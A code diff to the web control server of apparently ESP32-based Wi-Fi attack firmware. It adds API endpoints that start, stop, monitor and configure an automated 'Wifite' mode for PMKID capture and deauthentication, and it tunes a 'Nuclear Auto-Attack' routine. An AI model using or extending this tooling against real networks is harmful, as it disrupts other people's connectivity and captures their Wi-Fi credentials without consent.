@@ -20,6 +20,7 @@
 #include "../wifi/wps_scanner.h"
 #include "../wifi/target_intel.h"
 #include "../wifi/hidden_scanner.h"
+#include "../wifi/wifite_mode.h"
 
 class WebServer {
 public:
@@ -117,6 +118,10 @@ private:
         doc["fisher_captured"]= PMKIDFisher::get().captured;
         doc["wps_scan"]       = WPSScanner::get().running;
         doc["wps_count"]      = (int)WPSScanner::get().results.size();
+        doc["wifite"]         = WifiteMode::get().running;
+        doc["wifite_state"]   = (int)WifiteMode::get().state;
+        doc["wifite_cur"]     = (int)WifiteMode::get().curIdx;
+        doc["wifite_total"]   = (int)WifiteMode::get().targets.size();
         doc["ble_spam"]       = BLESpam::get().running;
         doc["ble_spam_pkts"]  = BLESpam::get().packetsSent;
         doc["intel_devs"]     = (int)TargetIntel::get().devices.size();
@@ -534,6 +539,27 @@ private:
             req->send(200,"application/json",out);
         });
 
+        // ── WifiteMode ────────────────────────────────────────────────────────
+        server.on("/api/wifite/start", HTTP_POST, [](AsyncWebServerRequest* req) {
+            WifiteMode::get().start();
+            req->send(200,"application/json","{\"ok\":true}");
+        });
+        server.on("/api/wifite/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
+            WifiteMode::get().stop();
+            req->send(200,"application/json","{\"ok\":true}");
+        });
+        server.on("/api/wifite/status", HTTP_GET, [](AsyncWebServerRequest* req) {
+            req->send(200,"application/json", WifiteMode::get().statusJson());
+        });
+        _postJson("/api/wifite/config", [](AsyncWebServerRequest* req, JsonDocument& doc) {
+            auto& w = WifiteMode::get();
+            if (doc.containsKey("minRSSI"))        w.minRSSI        = doc["minRSSI"] | 70;
+            if (doc.containsKey("pmkidTimeout"))   w.pmkidTimeoutMs = (doc["pmkidTimeout"] | 30) * 1000;
+            if (doc.containsKey("deauthTimeout"))  w.deauthTimeoutMs= (doc["deauthTimeout"] | 60) * 1000;
+            if (doc.containsKey("skipWeak"))       w.skipWeak       = doc["skipWeak"] | true;
+            req->send(200,"application/json","{\"ok\":true}");
+        });
+
         // ── Nuclear Auto-Attack ───────────────────────────────────────────────
         server.on("/api/nuclear/start", HTTP_POST, [](AsyncWebServerRequest* req) {
             auto& aps = WiFiScanner::get().aps();
@@ -561,8 +587,8 @@ private:
                     memset(t.client, 0xFF, 6);
                     t.channel = ap.channel;
                     dTargets.push_back(t);
-                    // 4. Adiciona ao Fisher
-                    PMKIDFisher::get().addTarget(mac, ap.ssid.c_str(), ap.channel);
+                    // 4. Adiciona ao Fisher (com RSSI real para delay adaptativo)
+                    PMKIDFisher::get().addTarget(mac, ap.ssid.c_str(), ap.channel, (int8_t)ap.rssi);
                 }
             }
             if (!dTargets.empty()) Deauther::get().startMulti(dTargets);
